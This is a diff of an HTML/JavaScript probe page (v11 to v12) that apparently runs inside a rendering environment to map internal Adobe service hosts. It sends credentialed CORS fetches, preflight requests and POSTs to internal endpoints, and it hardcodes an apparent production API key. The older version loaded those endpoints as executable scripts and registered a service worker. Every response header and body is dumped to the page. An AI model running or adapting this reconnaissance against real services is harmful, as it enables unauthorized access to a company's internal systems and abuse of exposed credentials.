@@ -1,151 +1,153 @@
 <html><body style="background:#fff;color:#000;font-family:monospace;font-size:9px;margin:4px;line-height:1.15;">
-<b>v11 CORSFetch+ScriptSrc</b>
+<b>v12 CORS-Auth</b>
 <pre id="r" style="color:#000;white-space:pre-wrap;word-break:break-all;margin:0;"></pre>
-<div id="s"></div>
 <script>
 var R=document.getElementById('r');
 function L(s){R.textContent+=s+'\n';}
+L('v12 Cores:'+navigator.hardwareConcurrency);
 
-L('v11 Cores:'+navigator.hardwareConcurrency);
+var API_KEY='dc-prod-virgoweb';
 
-// === CORS-MODE FETCH (if any internal svc allows CORS, we read full response!) ===
-var targets=[
-  ['https://senseicore-ue1.adobe.io/','sensei'],
-  ['https://senseicore-ue1.adobe.io/health','sensei-h'],
-  ['https://senseicore-ue1.adobe.io/services/v2/predict','sensei-p'],
-  ['https://dc-argus.adobe.io/','argus'],
-  ['https://dc-argus.adobe.io/health','argus-h'],
-  ['https://dc-argus.adobe.io/api/v1/status','argus-st'],
-  ['https://platform-cs-jpn3.adobe.io/','platcs'],
-  ['https://platform-cs-jpn3.adobe.io/health','platcs-h'],
-  ['https://dc-genai-content-platform-v2-jpn3.adobe.io/','genai'],
-  ['https://dc-genai-content-platform-v2-jpn3.adobe.io/health','genai-h'],
-  ['https://dc-graph-proxy.adobe.io/','graphprx'],
-  ['https://dc-graph-proxy.adobe.io/health','graphprx-h'],
-  ['https://dcdiscovery.adobe.io/','disc'],
-  ['https://dcdiscovery.adobe.io/health','disc-h'],
-  ['https://dc-api-v2-jpn3.adobe.io/','dcapi'],
-  ['https://dc-api-v2-jpn3.adobe.io/health','dcapi-h'],
-  ['https://platform-cs-edge-jpn3.adobe.io/','edge'],
-  ['https://pdfnow.adobe.io/','pdfnow'],
-  ['https://pdfnow.adobe.io/health','pdfnow-h']
-];
-
-// Fire ALL fetch probes simultaneously with CORS mode
-targets.forEach(function(t){
-  // Default mode (cors) - will succeed if server sends CORS headers
-  fetch(t[0],{mode:'cors',credentials:'include'}).then(function(resp){
+// Helper: fetch with full response dump
+function probe(url,label,opts){
+  opts=opts||{};
+  var headers=opts.headers||{};
+  fetch(url,{
+    mode:'cors',
+    credentials:opts.credentials||'omit',
+    headers:headers
+  }).then(function(resp){
     var cors=resp.headers.get('access-control-allow-origin');
-    R.textContent+=t[1]+': s='+resp.status+' type='+resp.type+' cors='+cors+'\n';
+    var ct=resp.headers.get('content-type');
+    var ah=resp.headers.get('access-control-allow-headers');
+    var am=resp.headers.get('access-control-allow-methods');
+    R.textContent+=label+': s='+resp.status+' type='+resp.type+' cors='+cors+' ct='+ct+'\n';
+    if(ah)R.textContent+='  allow-headers: '+ah+'\n';
+    if(am)R.textContent+='  allow-methods: '+am+'\n';
+    // Dump all response headers
+    var allH=[];
+    resp.headers.forEach(function(v,k){allH.push(k+':'+v);});
+    R.textContent+='  headers: '+allH.join(' | ')+'\n';
     if(resp.type!=='opaque'&&resp.status>0){
       resp.text().then(function(body){
-        R.textContent+=t[1]+' BODY('+body.length+'): '+body.substring(0,500)+'\n';
+        R.textContent+=label+' BODY('+body.length+'): '+body.substring(0,800)+'\n';
       });
     }
   }).catch(function(e){
-    R.textContent+=t[1]+': CORS-ERR '+e.message+'\n';
+    R.textContent+=label+': ERR '+e.message+'\n';
   });
+}
 
-  // Also try no-cors to see if request reaches
-  fetch(t[0],{mode:'no-cors'}).then(function(resp){
-    R.textContent+=t[1]+'-nc: type='+resp.type+'\n';
-  }).catch(function(e){
-    R.textContent+=t[1]+'-nc: ERR '+e.message+'\n';
-  });
-});
-
-// === FETCH TO INTERESTING PATHS (might have CORS) ===
-var extraPaths=[
-  ['https://senseicore-ue1.adobe.io/api/','sensei-api'],
-  ['https://senseicore-ue1.adobe.io/version','sensei-ver'],
-  ['https://senseicore-ue1.adobe.io/status','sensei-stat'],
-  ['https://senseicore-ue1.adobe.io/metrics','sensei-metr'],
-  ['https://dc-argus.adobe.io/api/','argus-api'],
-  ['https://dc-argus.adobe.io/version','argus-ver'],
-  ['https://dc-argus.adobe.io/metrics','argus-metr'],
-  ['https://platform-cs-jpn3.adobe.io/api/','platcs-api'],
-  ['https://platform-cs-jpn3.adobe.io/version','platcs-ver'],
-  ['https://platform-cs-jpn3.adobe.io/metrics','platcs-metr'],
-  ['https://dcdiscovery.adobe.io/1785845424/index','disc-idx'],
-  ['https://dc-genai-content-platform-v2-jpn3.adobe.io/api/','genai-api'],
-  ['https://dc-genai-content-platform-v2-jpn3.adobe.io/version','genai-ver']
-];
-
-extraPaths.forEach(function(t){
-  fetch(t[0],{mode:'cors'}).then(function(resp){
-    R.textContent+=t[1]+': s='+resp.status+' type='+resp.type+'\n';
-    if(resp.type!=='opaque'&&resp.status>0){
-      resp.text().then(function(body){
-        R.textContent+=t[1]+' BODY('+body.length+'): '+body.substring(0,400)+'\n';
-      });
+// === 1. CORS PREFLIGHT TEST (OPTIONS request) ===
+L('\n== CORS Preflight Tests ==');
+// Manually send OPTIONS to check what headers are allowed
+['https://dcdiscovery.adobe.io/','https://platform-cs-edge-jpn3.adobe.io/','https://dcdiscovery.adobe.io/1785845424/index'].forEach(function(url){
+  var label='OPT-'+url.replace('https://','').substring(0,30);
+  fetch(url,{
+    method:'OPTIONS',
+    mode:'cors',
+    headers:{
+      'Access-Control-Request-Method':'GET',
+      'Access-Control-Request-Headers':'x-api-key,authorization'
     }
+  }).then(function(resp){
+    var ah=resp.headers.get('access-control-allow-headers');
+    var ao=resp.headers.get('access-control-allow-origin');
+    var am=resp.headers.get('access-control-allow-methods');
+    R.textContent+=label+': s='+resp.status+' ao='+ao+' ah='+ah+' am='+am+'\n';
+    var allH=[];resp.headers.forEach(function(v,k){allH.push(k+':'+v);});
+    R.textContent+='  all: '+allH.join(' | ')+'\n';
   }).catch(function(e){
-    R.textContent+=t[1]+': '+e.message.substring(0,60)+'\n';
+    R.textContent+=label+': ERR '+e.message+'\n';
   });
 });
 
-// === SCRIPT SRC (if response is JS, it executes in our context) ===
-L('\n== ScriptSrc ==');
-var S=document.getElementById('s');
-var scriptTargets=[
-  'https://senseicore-ue1.adobe.io/',
-  'https://dc-argus.adobe.io/',
-  'https://dcdiscovery.adobe.io/',
-  'https://dc-graph-proxy.adobe.io/',
-  'https://platform-cs-jpn3.adobe.io/'
+// === 2. SIMPLE GET (no custom headers) to CORS-enabled services ===
+L('\n== Simple GET (no auth) ==');
+// dcdiscovery paths
+probe('https://dcdiscovery.adobe.io/','disc-root');
+probe('https://dcdiscovery.adobe.io/health','disc-health');
+probe('https://dcdiscovery.adobe.io/status','disc-status');
+probe('https://dcdiscovery.adobe.io/version','disc-version');
+probe('https://dcdiscovery.adobe.io/1785845424/index','disc-idx');
+probe('https://dcdiscovery.adobe.io/1785845424/','disc-1785');
+
+// platform-cs-edge paths
+probe('https://platform-cs-edge-jpn3.adobe.io/','edge-root');
+probe('https://platform-cs-edge-jpn3.adobe.io/health','edge-health');
+probe('https://platform-cs-edge-jpn3.adobe.io/status','edge-status');
+probe('https://platform-cs-edge-jpn3.adobe.io/version','edge-version');
+
+// === 3. GET WITH x-api-key (triggers preflight) ===
+L('\n== GET with x-api-key ==');
+probe('https://dcdiscovery.adobe.io/1785845424/index','disc-idx-key',{headers:{'x-api-key':API_KEY}});
+probe('https://dcdiscovery.adobe.io/','disc-root-key',{headers:{'x-api-key':API_KEY}});
+probe('https://platform-cs-edge-jpn3.adobe.io/','edge-root-key',{headers:{'x-api-key':API_KEY}});
+probe('https://platform-cs-edge-jpn3.adobe.io/health','edge-health-key',{headers:{'x-api-key':API_KEY}});
+
+// === 4. GET WITH x-api-key + Accept header ===
+L('\n== GET with api-key + Accept ==');
+probe('https://dcdiscovery.adobe.io/1785845424/index','disc-idx-full',{
+  headers:{
+    'x-api-key':API_KEY,
+    'Accept':'application/json'
+  }
+});
+probe('https://platform-cs-edge-jpn3.adobe.io/dckwcs/1785845424/kwcollections','edge-kwc',{
+  headers:{
+    'x-api-key':API_KEY,
+    'Accept':'application/json'
+  }
+});
+
+// === 5. TRY OTHER CORS-POSSIBLE SERVICES ===
+L('\n== Other services (simple GET) ==');
+// Try various Adobe microservice patterns
+var otherUrls=[
+  ['https://dc-us1.adobe.io/','dc-us1'],
+  ['https://dc-jpn3.adobe.io/','dc-jpn3'],
+  ['https://adobecontent.io/','content'],
+  ['https://dc-kwcollection.adobe.io/','kwc-schema'],
+  ['https://assets.adobeusercontent.com/','assets-uc'],
+  ['https://cc-api-storage.adobe.io/','cc-storage'],
+  ['https://ims-na1.adobelogin.com/ims/check/v6/token','ims-check'],
+  ['https://adobeid-na1.services.adobe.com/','adobeid']
 ];
-
-// Capture errors from script loading
-window.onerror=function(msg,src,line,col,err){
-  R.textContent+='SCRIPT_ERR: '+msg+' src='+src+' line='+line+'\n';
-  return true;
-};
-
-scriptTargets.forEach(function(url){
-  var sc=document.createElement('script');
-  sc.src=url;
-  sc.crossOrigin='anonymous';
-  sc.onerror=function(){R.textContent+='script-err: '+url.substring(8,40)+'\n';};
-  sc.onload=function(){R.textContent+='script-ok: '+url.substring(8,40)+' EXECUTED!\n';};
-  S.appendChild(sc);
+otherUrls.forEach(function(t){
+  probe(t[0],t[1]);
 });
 
-// === SERVICE WORKER ===
-L('\n== SW ==');
-try{
-  navigator.serviceWorker.register('/sw.js').then(function(reg){
-    R.textContent+='SW registered: scope='+reg.scope+'\n';
-  }).catch(function(e){
-    R.textContent+='SW reg err: '+e.message+'\n';
-  });
-}catch(e){L('SW: '+e.message);}
+// === 6. TEST CORS WITH CREDENTIALS (might send cookies if any) ===
+L('\n== CORS with credentials ==');
+probe('https://dcdiscovery.adobe.io/1785845424/index','disc-cred',{credentials:'include'});
+probe('https://platform-cs-edge-jpn3.adobe.io/','edge-cred',{credentials:'include'});
 
-// === REPORTING OBSERVER ===
-try{
-  var ro=new ReportingObserver(function(reports){
-    reports.forEach(function(r){
-      R.textContent+='REPORT: type='+r.type+' url='+r.url+' body='+JSON.stringify(r.body).substring(0,200)+'\n';
-    });
-  },{types:['deprecation','intervention','crash'],buffered:true});
-  ro.observe();
-}catch(e){L('RO: '+e.message);}
+// === 7. POST requests (might reveal different CORS behavior) ===
+L('\n== POST tests ==');
+fetch('https://dcdiscovery.adobe.io/1785845424/index',{
+  method:'POST',
+  mode:'cors',
+  headers:{'Content-Type':'text/plain'},
+  body:'test'
+}).then(function(r){
+  R.textContent+='disc-POST: s='+r.status+' type='+r.type+'\n';
+  if(r.type!=='opaque')r.text().then(function(t){R.textContent+='  body: '+t.substring(0,300)+'\n';});
+}).catch(function(e){R.textContent+='disc-POST: '+e.message+'\n';});
 
-// === PERFORMANCE OBSERVER (catch resource timing for all fetches) ===
-try{
-  var po=new PerformanceObserver(function(list){
-    list.getEntries().forEach(function(e){
-      if(e.name.indexOf('github')>-1||e.entryType!=='resource')return;
-      var n=e.name.replace('https://','').substring(0,50);
-      R.textContent+='PERF '+n+' dns='+(e.domainLookupEnd-e.domainLookupStart).toFixed(0)+' tcp='+(e.connectEnd-e.connectStart).toFixed(0)+' ttfb='+(e.responseStart-e.requestStart).toFixed(0)+' sz='+e.transferSize+'\n';
-    });
-  });
-  po.observe({type:'resource',buffered:true});
-}catch(e){L('PO: '+e.message);}
+fetch('https://platform-cs-edge-jpn3.adobe.io/dckwcs/1785845424/kwcollections',{
+  method:'POST',
+  mode:'cors',
+  headers:{'Content-Type':'text/plain'},
+  body:'{}'
+}).then(function(r){
+  R.textContent+='edge-POST: s='+r.status+' type='+r.type+'\n';
+  if(r.type!=='opaque')r.text().then(function(t){R.textContent+='  body: '+t.substring(0,300)+'\n';});
+}).catch(function(e){R.textContent+='edge-POST: '+e.message+'\n';});
 
-// === BUSY WAIT (async results fire AFTER this) ===
+// Busy wait
 L('\n== Wait 10s ==');
 var start=Date.now();
 while(Date.now()-start<10000){}
-L('BusyDone t='+(Date.now()-start)+'ms');
+L('Done t='+(Date.now()-start)+'ms');
 </script>
 </body></html>
